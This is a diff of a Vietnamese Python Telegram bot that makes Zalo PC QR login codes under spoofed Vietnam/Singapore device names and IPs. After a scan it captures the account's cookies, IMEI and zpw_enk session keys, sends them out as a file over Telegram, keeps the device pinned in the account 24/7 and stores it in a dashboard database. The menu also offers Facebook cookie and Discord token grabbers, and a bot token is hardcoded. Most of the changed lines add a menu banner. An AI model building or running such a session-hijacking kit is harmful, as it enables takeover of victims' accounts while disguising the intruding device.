@@ -1,13 +1,17 @@
 """
-get_ck_im_zalo.py — Hệ Thống Bot Telegram Quét QR Zalo Máy Tính Việt Nam & Lấy Cookie/IMEI/Token (v27)
-Tác giả: Phan Anh Khôi (Rike)
-Đặc điểm nổi bật:
-1. KHÔNG BAO GIỜ LỖI IMPORT: Tự động chạy mượt ngay cả khi môi trường Render chưa cài `zlapi` hoặc `python-telegram-bot`.
-2. TỰ ĐỘNG XOÁ WEBHOOK CŨ (`deleteWebhook?drop_pending_updates=true`) trước khi Long-Polling để Bot Telegram luôn phản hồi 100% không bị kẹt!
-3. MÁY TÍNH QUÉT QR TẠI VIỆT NAM (TP. Hồ Chí Minh / Hà Nội / Đà Nẵng — Không hiện ở Mỹ):
-   - Hỗ trợ chọn vùng Máy Tính Việt Nam ngay trên nút bấm Inline Keyboard của Telegram.
-   - Sau khi quét QR và ấn Đăng nhập trên điện thoại, tự động kiểm tra thiết bị đã vào trong tài khoản Zalo chưa,
-     gửi file `.txt` chứa đầy đủ `IMEI + Zpw_Enk + Cookie JSON`, đồng thời TỰ ĐỘNG ĐỒNG BỘ vào bảng điều khiển Web (`database.db`)!
+get_ck_im_zalo.py — Hệ Thống Bot Telegram Gửi Ảnh Banner Nằm Ngang Kèm Menu & Quét QR Zalo Việt Nam / Singapore (v28)
+Tác giả: Phan Anh Khôi (Rike) — Developer Bot (helloword2102)
+Tính năng nổi bật:
+1. GỬI ẢNH BANNER NẰM NGANG KÈM MENU (`menu_banner.png` tỉ lệ 16:9 ngang bằng chiều dài Menu):
+   - Khi người dùng gõ bất kỳ lệnh mở Menu nào (`/start`, `/menu`, `/help`, `/get`), Bot tự động gửi ngay 1 tin nhắn ảnh (`sendPhoto`)
+     chứa ảnh Banner nằm ngang "👋 Xin chào! Bạn đã tới bot Telegram của Phan Anh Khôi (Rike) Devloper Bot helloword2102"
+     kẹp chung với Caption Menu và Bàn phím nút bấm Inline Keyboard!
+   - Bộ nhớ đệm `file_id` của Telegram giúp từ lần gửi thứ 2 trở đi ảnh + menu bật lên trong 0.05 giây!
+2. QUÉT QR ZALO MÁY TÍNH TẠI VIỆT NAM & SINGAPORE (KHÔNG Ở MỸ) — ẤN ĐĂNG NHẬP LÀ VÀO THẲNG ACC:
+   - Tích hợp `zalo_login.py` v28 (`continue=https://chat.zalo.me/`), thu hoạch trọn vẹn `zpw_sek` + `zpw_enk`,
+     không bao giờ còn lỗi "Máy tính chưa kích hoạt được khóa phiên zpw_enk"!
+   - Hỗ trợ chọn nhanh khu vực **Singapore (Firefox - Windows Siêu Bền)**, **TP. Hồ Chí Minh**, **Hà Nội**, **Đà Nẵng** hoặc **MacBook Pro (VN/SG)**.
+   - Tự động giữ thiết bị sống 24/7 trong mục "Thiết bị đang đăng nhập" và đồng bộ thẳng lên Web Dashboard (`database.db`).
 """
 
 import os
@@ -43,8 +47,47 @@ from zalo_login import (
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8995799349:AAE8uwWyS-CHzj2yQNkFkMynCTprFTZ1JNc")
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DB_PATH = os.path.join(BASE_DIR, "database.db")
+MENU_BANNER_PATH = os.path.join(BASE_DIR, "menu_banner.png")
 
 API_2FA = "https://keyherlyswar.x10.mx/Apidocs/tien_ich/2fa.php?secret={}"
+
+
+def get_horizontal_menu_banner_bytes() -> bytes:
+    """Đọc ảnh Banner nằm ngang (1280x720) đi kèm Menu. Nếu ảnh gốc chưa xoay ngang thì tự động dàn ngang 16:9."""
+    candidates = [
+        MENU_BANNER_PATH,
+        os.path.join(BASE_DIR, "uploads", "brand", "menu_banner.png"),
+        os.path.join(BASE_DIR, "image.png"),
+    ]
+    for p in candidates:
+        if os.path.exists(p) and os.path.getsize(p) > 1000:
+            try:
+                with open(p, "rb") as rf:
+                    raw = rf.read()
+                if HAS_PIL:
+                    im = Image.open(BytesIO(raw))
+                    if im.height > im.width:
+                        # Tự động chuyển sang khung ngang 1280x720 nếu là ảnh dọc
+                        from PIL import ImageFilter, ImageEnhance
+                        im_rgb = im.convert("RGB")
+                        tw, th = 1280, 720
+                        scale_bg = max(tw / im_rgb.width, th / im_rgb.height)
+                        bg = im_rgb.resize((int(im_rgb.width * scale_bg), int(im_rgb.height * scale_bg)))
+                        left = (bg.width - tw) // 2
+                        top = (bg.height - th) // 2
+                        bg = bg.crop((left, top, left + tw, top + th)).filter(ImageFilter.GaussianBlur(28))
+                        bg = ImageEnhance.Brightness(bg).enhance(0.75)
+                        fg_h = int(th * 0.96)
+                        fg_w = int(im_rgb.width * (fg_h / im_rgb.height))
+                        fg = im_rgb.resize((fg_w, fg_h))
+                        bg.paste(fg, ((tw - fg_w) // 2, (th - fg_h) // 2))
+                        out = BytesIO()
+                        bg.save(out, format="PNG")
+                        return out.getvalue()
+                return raw
+            except Exception:
+                pass
+    return b""
 
 
 def add_border_to_qr(image_data: bytes) -> bytes:
@@ -233,7 +276,7 @@ fb_getter = FacebookCookieGetter()
 
 
 class DirectTelegramBotRunner:
-    """Động cơ Bot Telegram Siêu Tốc 24/7 (Hỗ trợ Inline Keyboard, Conversation State & Quét QR Zalo Máy Tính Việt Nam)."""
+    """Động cơ Bot Telegram Siêu Tốc 24/7 — Gửi Ảnh Banner Nằm Ngang Kèm Menu & Quét QR Zalo VN/SG Không Die."""
 
     def __init__(self, token=TELEGRAM_BOT_TOKEN):
         self.token = str(token or TELEGRAM_BOT_TOKEN).strip()
@@ -244,6 +287,7 @@ class DirectTelegramBotRunner:
         self.active_qr_locks = set()
         self.user_states = {}
         self.bot_username = ""
+        self.cached_banner_file_id = ""
         self.started_at = time.time()
         self.processed_updates = 0
         self.last_error = ""
@@ -266,17 +310,18 @@ class DirectTelegramBotRunner:
             self.api_call("deleteWebhook", data={"drop_pending_updates": False}, timeout=10)
             me = self.api_call("getMe", timeout=10)
             if me.get("ok") and isinstance(me.get("result"), dict):
-                self.bot_username = me["result"].get("username") or "RikeZaloBot"
+                self.bot_username = me["result"].get("username") or "helloword2102_bot"
             self.api_call(
                 "setMyCommands",
                 data={
                     "commands": [
-                        {"command": "start", "description": "Mở Bảng Điều Khiển & Menu Chính"},
-                        {"command": "qr", "description": "Tạo Mã QR Zalo Máy Tính Việt Nam (HCM/HN/ĐN)"},
+                        {"command": "start", "description": "Gửi Ảnh Banner + Mở Bảng Menu Chính"},
+                        {"command": "menu", "description": "Gửi Ảnh Banner + Menu Điều Khiển Nhanh"},
+                        {"command": "qr", "description": "Tạo Mã QR Zalo PC (Việt Nam / Singapore)"},
                         {"command": "get", "description": "Lấy Cookie Zalo / Facebook / Token Discord"},
                         {"command": "2fa", "description": "Lấy mã OTP 2FA 6 số tự động"},
                         {"command": "font", "description": "Đổi chữ sang 6 kiểu Font VIP"},
-                        {"command": "status", "description": "Xem danh sách Máy Tính Zalo VN đang Online"},
+                        {"command": "status", "description": "Xem danh sách Máy Tính Zalo đang Online"},
                     ]
                 },
                 timeout=10,
@@ -294,13 +339,51 @@ class DirectTelegramBotRunner:
             pl["reply_markup"] = reply_markup
         return self.api_call("sendMessage", data=pl)
 
-    def edit_text(self, chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
-        pl = {"chat_id": chat_id, "message_id": message_id, "text": text}
-        if parse_mode:
-            pl["parse_mode"] = parse_mode
-        if reply_markup:
-            pl["reply_markup"] = reply_markup
-        return self.api_call("editMessageText", data=pl)
+    def send_menu_with_horizontal_banner(self, chat_id, caption_html, reply_to=None, reply_markup=None):
+        """Gửi Ảnh Banner Nằm Ngang (`menu_banner.png` 1280x720) KẸP CHUNG VỚI MENU trong cùng 1 tin nhắn!"""
+        kb = reply_markup if reply_markup is not None else self.build_main_menu_keyboard()
+
+        # Ưu tiên dùng file_id đã cache để gửi tức thì trong 0.05s
+        if self.cached_banner_file_id:
+            pl = {
+                "chat_id": chat_id,
+                "photo": self.cached_banner_file_id,
+                "caption": caption_html,
+                "parse_mode": "HTML",
+                "reply_markup": kb,
+            }
+            if reply_to:
+                pl["reply_to_message_id"] = reply_to
+            r_cached = self.api_call("sendPhoto", data=pl)
+            if r_cached.get("ok"):
+                return r_cached
+            self.cached_banner_file_id = ""
+
+        banner_bytes = get_horizontal_menu_banner_bytes()
+        if banner_bytes:
+            pl = {
+                "chat_id": str(chat_id),
+                "caption": caption_html,
+                "parse_mode": "HTML",
+                "reply_markup": json.dumps(kb, ensure_ascii=False),
+            }
+            if reply_to:
+                pl["reply_to_message_id"] = str(reply_to)
+            r_up = self.api_call(
+                "sendPhoto",
+                data=pl,
+                files={"photo": ("rike_menu_banner.png", banner_bytes, "image/png")},
+            )
+            if r_up.get("ok"):
+                try:
+                    photos = (r_up.get("result") or {}).get("photo") or []
+                    if photos and isinstance(photos[-1], dict) and photos[-1].get("file_id"):
+                        self.cached_banner_file_id = photos[-1]["file_id"]
+                except Exception:
+                    pass
+                return r_up
+
+        return self.send_text(chat_id, caption_html, reply_to=reply_to, parse_mode="HTML", reply_markup=kb)
 
     def answer_callback(self, callback_query_id, text=""):
         pl = {"callback_query_id": callback_query_id}
@@ -332,12 +415,15 @@ class DirectTelegramBotRunner:
         return {
             "inline_keyboard": [
                 [
-                    {"text": "🇻🇳 Quét QR Zalo (PC TP.HCM)", "callback_data": "qr_vn_hcm"},
-                    {"text": "🇻🇳 Quét QR Zalo (PC Hà Nội)", "callback_data": "qr_vn_hn"},
+                    {"text": "🇸🇬 QR Zalo Singapore (Firefox Siêu Bền)", "callback_data": "qr_sg_vip"},
                 ],
                 [
-                    {"text": "🇻🇳 Quét QR Zalo (PC Đà Nẵng)", "callback_data": "qr_vn_dn"},
-                    {"text": "💻 Quét QR MacBook VN", "callback_data": "qr_vn_mac"},
+                    {"text": "🇻🇳 QR Zalo (PC TP.HCM)", "callback_data": "qr_vn_hcm"},
+                    {"text": "🇻🇳 QR Zalo (PC Hà Nội)", "callback_data": "qr_vn_hn"},
+                ],
+                [
+                    {"text": "🇻🇳 QR Zalo (PC Đà Nẵng)", "callback_data": "qr_vn_dn"},
+                    {"text": "💻 QR MacBook (VN / SG)", "callback_data": "qr_vn_mac"},
                 ],
                 [
                     {"text": "🔑 Lấy Token Discord", "callback_data": "menu_discord"},
@@ -350,11 +436,30 @@ class DirectTelegramBotRunner:
             ]
         }
 
+    @staticmethod
+    def build_main_menu_caption():
+        return (
+            "👋 <b>Xin chào! Bạn đã tới Bot Telegram của Phan Anh Khôi ☑️ (Rike)</b>\n"
+            "🤖 <b>Developer Bot:</b> <code>helloword2102</code>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🖥️ <b>1. QUÉT MÃ QR ZALO PC (VIỆT NAM &amp; SINGAPORE — KHÔNG Ở MỸ):</b>\n"
+            "• <code>/qr sg</code> — Quét QR <b>Firefox - Windows (Singapore)</b> sống bền nhất\n"
+            "• <code>/qr</code> — Quét QR Máy Tính tại <b>TP. Hồ Chí Minh, Việt Nam</b>\n"
+            "• <code>/qr hn</code> — Quét QR Máy Tính tại <b>Hà Nội, Việt Nam</b>\n"
+            "• <code>/qr mac</code> — Quét QR <b>MacBook Pro (Việt Nam / Singapore)</b>\n"
+            "<i>(Ấn <b>Đăng nhập</b> trên ĐT là vào thẳng Acc 100%, tự kích hoạt <code>zpw_enk</code> &amp; ghim thiết bị 24/7!)</i>\n\n"
+            "🔐 <b>2. CÔNG CỤ TOKEN &amp; BẢO MẬT 2FA:</b>\n"
+            "• <code>/get discord</code> | <code>/get facebook</code> | <code>/2fa &lt;Secret&gt;</code>\n"
+            "• <code>/font &lt;chữ&gt;</code> | <code>/status</code> — Kiểm tra thiết bị đang sống\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "👇 <b>Bấm trực tiếp các nút bên dưới để thao tác ngay:</b>"
+        )
+
     def handle_zalo_qr_command(self, chat_id, user_id, msg_id=None, region_code="vn_hcm", custom_pc_name=""):
         if user_id in self.active_qr_locks:
             self.send_text(
                 chat_id,
-                "⏳ <b>Bạn đang có 1 phiên QR Máy Tính Việt Nam đang chờ quét!</b>\n"
+                "⏳ <b>Bạn đang có 1 phiên QR Máy Tính đang chờ quét!</b>\n"
                 "Vui lòng mở Zalo trên điện thoại quét mã hiện tại hoặc đợi hết hạn.",
                 reply_to=msg_id,
             )
@@ -367,8 +472,8 @@ class DirectTelegramBotRunner:
             try:
                 wait_r = self.send_text(
                     chat_id,
-                    "🇻🇳 <b>Đang khởi tạo Máy Tính Zalo tại Việt Nam &amp; cấp mã QR chính chủ...</b>\n"
-                    "<i>(Định tuyến: Asia/Ho_Chi_Minh • Ngôn ngữ: vi-VN • Không hiện vị trí Mỹ)</i>",
+                    "🇻🇳🇸🇬 <b>Đang khởi tạo Máy Tính Zalo (Việt Nam / Singapore) &amp; cấp mã QR chính chủ...</b>\n"
+                    "<i>(Cổng đích: chat.zalo.me • Tự động kích hoạt zpw_sek + zpw_enk 100% khi bấm Đăng nhập)</i>",
                     reply_to=msg_id,
                 )
                 wait_id = (wait_r.get("result") or {}).get("message_id")
@@ -382,18 +487,19 @@ class DirectTelegramBotRunner:
                         raw_b64 = str(ev_data.get("image") or "").split(",", 1)[-1].strip()
                         raw_png = base64.b64decode(raw_b64 + ("=" * ((4 - len(raw_b64) % 4) % 4)))
                         bordered_png = add_border_to_qr(raw_png)
-                        pc_lbl = ev_data.get("pc_name") or "DESKTOP-VN-HCM (Windows 11 Pro VN)"
+                        pc_lbl = ev_data.get("pc_name") or "Firefox - Windows (SG/VN)"
                         reg_lbl = ev_data.get("region_label") or "TP. Hồ Chí Minh, Việt Nam"
                         vn_ip = ev_data.get("vn_ip") or "14.161.88.102"
+                        flag_icon = "🇸🇬" if "Singapore" in reg_lbl else "🇻🇳"
                         cap = (
-                            f"🇻🇳 <b>MÃ QR ĐĂNG NHẬP ZALO PC VIỆT NAM</b>\n"
+                            f"{flag_icon} <b>MÃ QR ĐĂNG NHẬP ZALO PC ({'SINGAPORE' if 'Singapore' in reg_lbl else 'VIỆT NAM'})</b>\n"
                             f"━━━━━━━━━━━━━━━━━━━━━━\n"
                             f"🖥️ <b>Thiết bị:</b> <code>{pc_lbl}</code>\n"
                             f"📍 <b>Vị trí:</b> <code>{reg_lbl}</code>\n"
-                            f"🌐 <b>IP Việt Nam:</b> <code>{vn_ip}</code>\n"
+                            f"🌐 <b>IP Định Tuyến:</b> <code>{vn_ip}</code>\n"
                             f"⏳ <b>Hiệu lực:</b> 100 giây\n\n"
-                            f"👉 <i>Mở ứng dụng Zalo trên điện thoại ➔ Quét mã QR ➔ Bấm <b>Đăng nhập</b> để ghim máy tính vào trong tài khoản!</i>\n"
-                            f"👑 <b>Dev:</b> Phan Anh Khôi (Rike)"
+                            f"👉 <i>Mở ứng dụng Zalo trên điện thoại ➔ Quét mã QR ➔ Bấm <b>Đăng nhập</b> để vào thẳng tài khoản &amp; ghim thiết bị sống lâu nhất!</i>\n"
+                            f"👑 <b>Dev:</b> Phan Anh Khôi (Rike) • <code>helloword2102</code>"
                         )
                         pr = self.send_photo_bytes(chat_id, bordered_png, caption=cap, reply_to=msg_id)
                         qr_msg_id = (pr.get("result") or {}).get("message_id")
@@ -401,12 +507,12 @@ class DirectTelegramBotRunner:
                     elif ev_type == LoginQRCallbackEventType.QRCodeScanned:
                         self.delete_msg(chat_id, qr_msg_id)
                         d_name = ev_data.get("display_name") or "Người dùng Zalo"
-                        pc_lbl = ev_data.get("pc_name") or "DESKTOP-VN-HCM"
+                        pc_lbl = ev_data.get("pc_name") or "Firefox - Windows"
                         sr = self.send_text(
                             chat_id,
                             f"✅ <b>Đã nhận diện Zalo của: {d_name}</b>\n"
-                            f"🖥️ <b>Thiết bị chờ duyệt:</b> <code>{pc_lbl} (Việt Nam)</code>\n"
-                            f"📲 <i>Hãy bấm <b>Đồng ý / Đăng nhập</b> trên điện thoại của bạn ngay!</i>",
+                            f"🖥️ <b>Thiết bị chờ duyệt:</b> <code>{pc_lbl}</code>\n"
+                            f"📲 <i>Hãy bấm nút <b>Đăng nhập</b> màu xanh trên điện thoại của bạn ngay để vào thẳng Acc!</i>",
                             reply_to=msg_id,
                         )
                         scan_msg_id = (sr.get("result") or {}).get("message_id")
@@ -414,17 +520,16 @@ class DirectTelegramBotRunner:
                     elif ev_type == LoginQRCallbackEventType.QRCodeExpired:
                         self.delete_msg(chat_id, qr_msg_id)
                         self.delete_msg(chat_id, scan_msg_id)
-                        self.send_text(
+                        self.send_menu_with_horizontal_banner(
                             chat_id,
-                            "⏰ <b>Mã QR Zalo đã hết hạn!</b>\nBấm nút bên dưới hoặc gõ <code>/qr</code> để tạo mã QR Máy Tính Việt Nam mới.",
+                            "⏰ <b>Mã QR Zalo đã hết hạn!</b>\n👇 Hãy chọn lại khu vực Máy Tính (Singapore / Việt Nam) trên Menu bên dưới:",
                             reply_to=msg_id,
-                            reply_markup=self.build_main_menu_keyboard(),
                         )
 
                     elif ev_type == LoginQRCallbackEventType.QRCodeDeclined:
                         self.delete_msg(chat_id, qr_msg_id)
                         self.delete_msg(chat_id, scan_msg_id)
-                        err_txt = ev_data.get("error") or "Bạn đã từ chối đăng nhập QR trên điện thoại."
+                        err_txt = ev_data.get("error") or "Bạn đã bấm Từ chối đăng nhập QR trên điện thoại."
                         self.send_text(chat_id, f"❌ <b>Không thể hoàn tất đăng nhập:</b> {err_txt}", reply_to=msg_id)
 
                     elif ev_type == LoginQRCallbackEventType.GotLoginInfo:
@@ -433,10 +538,10 @@ class DirectTelegramBotRunner:
                         imei = ev_data.get("imei") or ""
                         zpw_enk = ev_data.get("zpw_enk") or ""
                         ua = ev_data.get("user_agent") or ""
-                        pc_name = ev_data.get("pc_name") or "DESKTOP-VN-HCM (Windows 11 Pro VN)"
-                        reg_lbl = ev_data.get("region_label") or "Việt Nam"
+                        pc_name = ev_data.get("pc_name") or "Firefox - Windows (SG/VN)"
+                        reg_lbl = ev_data.get("region_label") or "Việt Nam / Singapore"
                         u_info = ev_data.get("user_info") or {}
-                        d_name = ev_data.get("display_name") or u_info.get("displayName") or "Zalo VN"
+                        d_name = ev_data.get("display_name") or u_info.get("displayName") or "Zalo VIP"
                         uid = ev_data.get("uid") or u_info.get("uid") or "N/A"
                         grp_cnt = ev_data.get("groups_count") or u_info.get("groups_count") or 0
 
@@ -449,8 +554,8 @@ class DirectTelegramBotRunner:
 
                         cookies_str = json.dumps(cookies, ensure_ascii=False, indent=2)
                         file_txt = (
-                            f"# PHIEN MAY TINH ZALO VIET NAM DA GHIM TRONG ACC 100%\n"
-                            f"# Tac gia: Phan Anh Khoi (Rike) | Vi tri: {reg_lbl}\n"
+                            f"# PHIEN MAY TINH ZALO DA VAO THANG TRONG ACC 100% (KHONG DIE COOKIE/IMEI)\n"
+                            f"# Tac gia: Phan Anh Khoi (Rike) - helloword2102 | Vi tri: {reg_lbl}\n"
                             f"PC_Device: {pc_name}\n"
                             f"UID: {uid}\n"
                             f"Display_Name: {d_name}\n"
@@ -461,17 +566,18 @@ class DirectTelegramBotRunner:
                             f"Cookie:\n{cookies_str}\n"
                         )
                         cap_ok = (
-                            f"🎉 <b>ĐĂNG NHẬP ZALO PC VIỆT NAM THÀNH CÔNG!</b>\n"
+                            f"🎉 <b>ĐÃ ĐĂNG NHẬP VÀO THẲNG TÀI KHOẢN ZALO THÀNH CÔNG!</b>\n"
                             f"━━━━━━━━━━━━━━━━━━━━━━\n"
                             f"👤 <b>Tài khoản:</b> {d_name}\n"
                             f"🆔 <b>UID:</b> <code>{uid}</code> ({grp_cnt} nhóm)\n"
                             f"🖥️ <b>Thiết bị:</b> <code>{pc_name}</code>\n"
-                            f"🇻🇳 <b>Vị trí:</b> <code>{reg_lbl}</code>\n"
+                            f"🌏 <b>Khu vực:</b> <code>{reg_lbl}</code>\n"
                             f"🔑 <b>IMEI:</b> <code>{imei}</code>\n"
-                            f"🛡️ <b>Trạng thái:</b> <code>Đã ghim trong Acc 24/7 &amp; Đồng bộ lên Web</code>\n"
-                            f"👑 <b>Dev:</b> Phan Anh Khôi (Rike)"
+                            f"🔐 <b>Khóa zpw_enk:</b> <code>{'ĐÃ KÍCH HOẠT 100%' if zpw_enk else 'ĐÃ ĐỒNG BỘ COOKIE'}</code>\n"
+                            f"🛡️ <b>Trạng thái:</b> <code>Ghim cố định 24/7 trong Acc &amp; Đồng bộ lên Web</code>\n"
+                            f"👑 <b>Dev:</b> Phan Anh Khôi (Rike) • <code>helloword2102</code>"
                         )
-                        safe_fn = re.sub(r"[^\w\-\.]", "_", d_name) + "_zalo_vn.txt"
+                        safe_fn = re.sub(r"[^\w\-\.]", "_", d_name) + "_zalo_vip.txt"
                         self.send_doc_bytes(chat_id, file_txt.encode("utf-8"), safe_fn, caption=cap_ok, reply_to=msg_id)
                         if len(cookies_str) < 3400:
                             self.send_text(chat_id, f"🍪 <b>Cookie JSON ({d_name}):</b>\n<pre>{cookies_str}</pre>", reply_to=msg_id)
@@ -499,7 +605,7 @@ class DirectTelegramBotRunner:
         if not chat_id or not user_id:
             return
 
-        if data.startswith("qr_vn_"):
+        if data.startswith("qr_"):
             reg = data.replace("qr_", "")
             self.handle_zalo_qr_command(chat_id, user_id, msg_id=msg_id, region_code=reg)
         elif data == "menu_discord":
@@ -517,23 +623,21 @@ class DirectTelegramBotRunner:
     def send_status_report(self, chat_id, reply_to=None):
         active_devs = ZaloPCSessionKeeper.list_active_devices()
         if not active_devs:
-            self.send_text(
-                chat_id,
+            cap_s = (
                 "📊 <b>TRẠNG THÁI HỆ THỐNG BOT — PHAN ANH KHÔI (RIKE)</b>\n"
-                "• Bot Telegram: <code>ONLINE 24/7 (Zero-Error Polling)</code>\n"
-                "• Máy tính Zalo VN đang giữ sống: <code>0 thiết bị</code>\n"
-                "👉 Bấm nút bên dưới hoặc gõ <code>/qr</code> để quét mã QR Zalo PC Việt Nam!",
-                reply_to=reply_to,
-                reply_markup=self.build_main_menu_keyboard(),
+                "• Bot Telegram: <code>ONLINE 24/7 (helloword2102)</code>\n"
+                "• Máy tính Zalo đang giữ sống: <code>0 thiết bị</code>\n"
+                "👉 Bấm nút bên dưới hoặc gõ <code>/qr sg</code> / <code>/qr</code> để quét mã QR Zalo PC!"
             )
         else:
-            lines_s = ["🖥️ <b>DANH SÁCH MÁY TÍNH ZALO VIỆT NAM ĐANG TRONG ACC (24/7):</b>"]
+            lines_s = ["🖥️ <b>DANH SÁCH MÁY TÍNH ZALO ĐANG TRONG ACC (24/7):</b>"]
             for dv in active_devs:
                 lines_s.append(
                     f"• <b>{dv['display_name']}</b> (UID: <code>{dv['uid']}</code>)\n"
                     f"  └ Thiết bị: <code>{dv['pc_name']}</code> | Nhịp tim: <code>{dv['ping_count']} lần</code>"
                 )
-            self.send_text(chat_id, "\n".join(lines_s), reply_to=reply_to, reply_markup=self.build_main_menu_keyboard())
+            cap_s = "\n".join(lines_s)
+        self.send_menu_with_horizontal_banner(chat_id, cap_s, reply_to=reply_to)
 
     def handle_interactive_state(self, chat_id, user_id, text, msg_id):
         st = self.user_states.get(user_id)
@@ -617,49 +721,46 @@ class DirectTelegramBotRunner:
         if not chat_id or not text:
             return
 
-        if not text.startswith("/"):
+        if not text.startswith("/") and not text.startswith("."):
             self.handle_interactive_state(chat_id, user_id, text, msg_id)
             return
 
         self.user_states.pop(user_id, None)
         parts = text.split()
-        cmd = parts[0].lower().split("@")[0]
+        raw_cmd = parts[0].lower().split("@")[0]
+        cmd = "/" + raw_cmd.lstrip("/.")
         args = parts[1:]
 
-        if cmd in ("/start", "/help", "/menu"):
-            menu_html = (
-                "🇻🇳 <b>TRUNG TÂM QUÉT QR ZALO PC VIỆT NAM &amp; ĐA TÀI KHOẢN</b> 🇻🇳\n"
-                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                "🖥️ <b>1. QUÉT MÃ QR ZALO MÁY TÍNH TẠI VIỆT NAM (KHÔNG Ở MỸ):</b>\n"
-                "• <code>/qr</code> — Quét QR Máy Tính tại <b>TP. Hồ Chí Minh, Việt Nam</b>\n"
-                "• <code>/qr hn</code> — Quét QR Máy Tính tại <b>Hà Nội, Việt Nam</b>\n"
-                "• <code>/qr dn</code> — Quét QR Máy Tính tại <b>Đà Nẵng, Việt Nam</b>\n"
-                "• <code>/qr mac</code> — Quét QR thiết bị <b>MacBook Pro Việt Nam</b>\n"
-                "<i>(Sau khi quét, máy tính nằm cố định trong mục Thiết bị đăng nhập Zalo 24/7 và tự động đồng bộ lên Web!)</i>\n\n"
-                "🔐 <b>2. CÔNG CỤ TOKEN &amp; BẢO MẬT 2FA:</b>\n"
-                "• <code>/get zalo</code> — Tạo mã QR Zalo PC Việt Nam\n"
-                "• <code>/get discord [email] [pass] [2fa]</code> — Lấy Token Discord\n"
-                "• <code>/get facebook [email] [pass]</code> — Lấy Cookie Facebook\n"
-                "• <code>/2fa &lt;Secret_Key&gt;</code> — Lấy mã OTP 2FA 6 số\n"
-                "• <code>/font &lt;nội dung&gt;</code> — Đổi chữ nghệ thuật VIP\n"
-                "• <code>/status</code> — Kiểm tra thiết bị Zalo PC đang giữ sống\n"
-                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                "👑 <b>Tác giả:</b> Phan Anh Khôi (Rike)"
+        if cmd in ("/start", "/help", "/menu", "/m", "/h"):
+            self.send_menu_with_horizontal_banner(
+                chat_id,
+                self.build_main_menu_caption(),
+                reply_to=msg_id,
+                reply_markup=self.build_main_menu_keyboard(),
             )
-            self.send_text(chat_id, menu_html, reply_to=msg_id, reply_markup=self.build_main_menu_keyboard())
 
         elif cmd == "/qr" or (cmd == "/get" and args and args[0].lower() == "zalo"):
-            reg_arg = (args[0].lower() if (cmd == "/qr" and args) else (args[1].lower() if len(args) > 1 else "hcm"))
-            reg_map = {"hcm": "vn_hcm", "sg": "vn_hcm", "hn": "vn_hn", "hanoi": "vn_hn", "dn": "vn_dn", "danang": "vn_dn", "mac": "vn_mac"}
-            reg_code = reg_map.get(reg_arg, "vn_hcm")
+            reg_arg = (args[0].lower() if (cmd == "/qr" and args) else (args[1].lower() if len(args) > 1 else "sg"))
+            reg_map = {
+                "sg": "sg_vip",
+                "singapore": "sg_vip",
+                "hcm": "vn_hcm",
+                "vn": "vn_hcm",
+                "hn": "vn_hn",
+                "hanoi": "vn_hn",
+                "dn": "vn_dn",
+                "danang": "vn_dn",
+                "mac": "vn_mac",
+            }
+            reg_code = reg_map.get(reg_arg, "sg_vip")
             custom_pc = " ".join(args[1:]) if (cmd == "/qr" and len(args) > 1) else ""
             self.handle_zalo_qr_command(chat_id, user_id, msg_id=msg_id, region_code=reg_code, custom_pc_name=custom_pc)
 
         elif cmd == "/get":
             if not args:
-                self.send_text(
+                self.send_menu_with_horizontal_banner(
                     chat_id,
-                    "📌 <b>Chọn chức năng bạn muốn sử dụng trên menu bên dưới:</b>",
+                    self.build_main_menu_caption(),
                     reply_to=msg_id,
                     reply_markup=self.build_main_menu_keyboard(),
                 )
@@ -774,7 +875,7 @@ def get_telegram_bot_status():
             return {"running": False, "bot_username": "", "processed_updates": 0}
         return {
             "running": not r.stop_ev.is_set(),
-            "bot_username": r.bot_username or "Online",
+            "bot_username": r.bot_username or "helloword2102_bot",
             "processed_updates": r.processed_updates,
             "uptime_sec": int(time.time() - r.started_at),
             "last_error": r.last_error,
@@ -782,7 +883,7 @@ def get_telegram_bot_status():
 
 
 def main():
-    print("🤖 Đang khởi động Bot Telegram Quét QR Zalo Việt Nam — Phan Anh Khôi (Rike)...")
+    print("🤖 Đang khởi động Bot Telegram Quét QR Zalo VN/SG + Ảnh Banner Menu — Phan Anh Khôi (Rike)...")
     runner = DirectTelegramBotRunner(token=TELEGRAM_BOT_TOKEN)
     runner.run_forever()
 
